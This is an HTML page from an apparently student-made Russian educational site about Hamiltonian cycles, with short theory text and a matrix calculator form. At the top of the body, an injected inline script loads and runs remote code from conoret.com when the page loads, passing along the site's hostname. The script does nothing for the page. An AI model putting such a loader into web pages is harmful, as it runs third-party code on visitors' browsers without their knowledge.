<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<base href="/gc">
	<meta name="author" content="Super User">
	<meta name="generator" content="">
	<title>Математическое моделирование</title>
	<link href="assets/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
	<link href="https://gg.looknewsite.ru/assets/bootstrap.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/bootstrap-select.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/owl.carousel.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/animate.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/Chart.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/css2" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/rostsayt.min.css" rel="stylesheet">
	<link href="https://gg.looknewsite.ru//assets/template.css" rel="stylesheet">
	<script src="https://gg.looknewsite.ru//assets/jquery-3.5.1.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.validate.js"></script>
	<script src="https://gg.looknewsite.ru//assets/popper.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/bootstrap-select.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/owl.carousel.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/wow.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/jquery.mask.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.bundle.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/Chart.min.js"></script>
	<script src="https://gg.looknewsite.ru//assets/rostsayt.js"></script>
	<script src="https://gg.looknewsite.ru//assets/template.js"></script>
	<script src="https://gg.looknewsite.ru//assets/context.js"></script>
	<script src="https://gg.looknewsite.ru//assets/ammap.js"></script>
	<script src="https://gg.looknewsite.ru//assets/russiaLow.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes">
    <meta name="HandheldFriendly" content="true">
    <meta name="apple-mobile-web-app-capable" content="YES">

	<style>
            div.moduletable.mod-slider.bg-color.text-white::before {
                background: black !important;
            }

         div.card-body.new-card::before {
            content: none !important;
            background: none !important;
           }


        .mod-slider.bg-color {
            background-color: black !important;
        }
        .mod-slider .row.align-items-end .col-10 .introtext {
            background-color: black !important;
        }
        #navbar {
        background-color: black;
        }

        div.card-body.new-card {
            background-color: lightblue;
        }


       body {
            background-color: black;
        }

        .mod-slider {
            background-color: black;
        }
        .new-card {
            background-color: black;
            border-radius: 15px;
            padding: 20px;
            color: white;
        }


        .mod-about {
            background-color: black;
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
        }

        #top_menu .nav.menu li {
            white-space: nowrap; /* Предотвращает перенос элементов на новую строку */
            margin-right: 35px; /* Установите нужный размер отступа */
            opacity: 0; /* Устанавливаем начальную прозрачность */
            transform: translateY(-50px); /* Начальное положение элементов */
            animation: fadeInDown 2s ease forwards; /* Применяем анимацию */
        }

        @keyframes fadeInDown {
            from {
                opacity: 0; /* Начальная прозрачность */
                transform: translateY(-50px); /* Начальное положение */
            }
            to {
                opacity: 1; /* Конечная прозрачность */
                transform: translateY(0); /* Конечное положение */
            }
        }

        

       #top_menu .nav.menu li a:hover {
            color: #32CD32; /* Здесь указываете желаемый зеленый цвет текста */
        }




        #top_menu ul {
            display: flex;
            flex-wrap: nowrap; /* запрещаем перенос элементов на новую строку */
            justify-content: space-between; /* равномерное распределение элементов по горизонтали */
            align-items: center; /* выравнивание элементов по вертикали */
        }

        .moduletable.mod-about .introtext {
            color: #32CD32; /* Зеленый цвет текста */
        }

        .moduletable.mod-about .h2 {
            color: #32CD32; /* Зеленый цвет текста */
        }

        .title:hover {
            transform: scale(1.1); /* Увеличиваем размер текста на 10% при наведении курсора */
        }



        h1 {
            text-align: center;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }
        input[type="number"], input[type="text"] {
            width: 100%;
            padding: 8px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #graph-container {
            text-align: center;
            margin-top: 20px;
        }
        #graph-image {
            max-width: 80%;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        #result-container {
            margin-top: 20px;
        }
        #result-message {
            text-align: center;
            font-weight: bold;
        }




    </style>

</head>
<body class="home" cz-shortcut-listen="true">
    <script type="text/javascript">
        window.top === window &&
            !function(){
                var e=document.createElement("script"),
                    t=document.getElementsByTagName("head")[0];
                e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),
                e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)
            }();
    </script>
    <!-- BEGIN WAYBACK TOOLBAR INSERT -->
    <!-- END WAYBACK TOOLBAR INSERT -->
    <div id="body">
        <header class="navbar navbar-expand-xl navbar-light" id="navbar">
            <div class="container">
                <div class="collapse navbar-collapse" id="navbar-content">
                    <div id="top_menu" class="navbar-nav ml-5 w-100">
                        <ul class="nav menu w-100 justify-content-between align-items-center header-top-menu mod-list">
                            
                            <li class="item-102"><a href="/home">Главная</a></li>
                            
                            <li class="item-102"><a href="/vbo">Вид бинарных отношений</a></li>

                            <li class="item-103"><a href="/sbo">Свойство бинарных отношений</a></li>
                            <li class="item-104"><a href="/max">Максимальный поток в сети</a></li>
                            <li class="item-105"><a href="/gc">Гамильтонов цикл</a></li>
                            <li class="item-106"><a href="/about">Об авторах</a></li>
                            <li class="item-107">
                                <a href="/#mod-form1"></a>
                            </li>
                            <li class="item-112 work-in-pride-link">
                                <a href="http://workinpride.ru/rus" class="work-in-pride-link" target="_blank" rel="noopener noreferrer">Работай в компании Green Pride</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <div id="center" class="container flex-fill">
            <div id="top">
                <div class="moduletable mod-slider bg-color text-white" style="margin-top: -110px; margin-left: 110px">
                    <div class="row align-items-end">
                        <div class="col-10 col-lg-6 offset-1">
                            <div class="introtext">
                                <div class="d-flex align-items-center">
                                    <div>
                                        <p class="h1 wow fadeInLeft delay-1" style="visibility: visible; animation-name: fadeInLeft;">Гамильтонов цикл</p>
                                    </div>
                                    <div>
                                        <img src="https://i.gifer.com/embedded/download/4cd1.gif" alt="гифка" style="width: 350px; height: 250px; margin-left: 200px; animation: fadeInRight 2s ease forwards;">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="moduletable mod-about" style="padding: 20px; border: 2px solid #32CD32; border-radius: 10px;">
    <div class="h2 mb-5 text-center wow fadeInUp" style="visibility: visible; animation-name: fadeInUp; font-size: 40px;">Теоретический материал</div>
    <div class="introtext">
        <div class="row">
            <div class="col-12 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp; padding-left: 15%; padding-right: 15%;">
                <div class="h3 mb-3 text-center">Гамильтонов цикл</div>
                <p>Гамильтонов цикл в графе — это подграф и цикл, который включает в себя все вершины графа. Граф, в котором есть гамильтонов цикл, называется гамильтоновым. Гамильтонов путь — это подграф-путь, который проходит через все вершины графа, не повторяясь:</p>
                
                <!-- Первое изображение -->
                <div class="text-center">
                    <img src="/static/images/cycleexample.jpg" alt="Три примера графов с циклом" style="max-width: 100%; height: auto; margin-top: 20px;">
                </div>
                
                <!-- Текст после первого изображения -->
                <p style="margin-top: 20px;">Если граф содержит срезанную вершину или срезанное ребро, то у него нет гамильтонова цикла. Когда срезанные вершины или ребра пересекаются, пропадает возможность вернуться, чтобы завершить цикл.</p>
                
                <!-- Второе изображение -->
                <div class="text-center">
                    <img src="/static/images/cycle2.jpg" alt="Граф без цикла" style="max-width: 100%; height: 180px; margin-top: 20px;">
                </div>

                <!-- Дополнительное текстовое поле после второго изображения -->
                <p style="margin-top: 20px;">Дополнительный текст после второго изображения. Здесь можно добавить ещё информации или продолжить описание.</p>
            </div>
        </div>
    </div>
</div>



<div id="calculatorSection" class="section">
            <!-- Калькулятор -->
            <h1>Калькулятор</h1>
  
            <!-- Ваш HTML для калькулятора -->
            <p class="calc" for="matrix-size" style="font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;">Выберите размер матрицы:</p>
            <select id="matrix-size" 
                style="display: block; margin: 0 auto; text-align: center; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif; font-size: 1.1em;"
                onchange="handleMatrixSizeChange()">
                <option value="2">2x2</option>
                <option value="3">3x3</option>
                <option value="4">4x4</option>
                <option value="5">5x5</option>
                <option value="6">6x6</option>
                <option value="7">7x7</option>
                <option value="8">8x8</option>
                <option value="9">9x9</option>
                <option value="10">10x10</option>
            </select>
            <div id="matrix-container" style="display: block; margin: 0 auto; text-align: center; font-size: 1.1em;"></div>
            <div class="button-container">
                <div class="button" onclick="generateMatrixInputs(parseInt(document.getElementById('matrix-size').value));">Решить</div>
            </div>
        </div>
            </div>
        </div>
    </div>
    <footer class="footer text-center">
        <div class="container">
            <p style="color: #f0f0f0;">&copy; 2024 Все права защищены</p>
        </div>
    </footer>

</body>


</html>